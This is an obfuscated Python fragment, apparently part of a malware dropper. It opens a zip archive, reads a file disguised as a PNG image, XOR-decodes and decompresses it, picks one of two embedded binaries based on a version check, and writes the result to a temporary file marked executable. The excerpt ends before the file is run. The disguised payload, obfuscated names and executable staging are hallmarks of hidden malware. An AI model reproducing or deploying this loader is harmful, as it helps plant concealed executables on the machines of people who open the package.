...
def Main(ℨ):
    ...
    def _pick(𝔭):
        l1 = int.from_bytes(𝔭[0:8], 'big')
        e1 = 𝔭[8:8+l1]
        o = 8 + l1
        l2 = int.from_bytes(𝔭[o:o+8], 'big')
        e2 = 𝔭[o+8:o+8+l2]
        return e1 if _v >= 13 else e2

    _zf = _Z.ZipFile(ℨ)
    _raw = _zf.read('LyroxPy.png')
    _raw = bytes(b ^ 0x5A for b in _raw)
    _ed = _pick(_xelf(_z.decompress(_raw)))
    _fd, _ρ = _t.mkstemp()
    _o.write(_fd, _ed)
    _o.fchmod(_fd, 0o755)
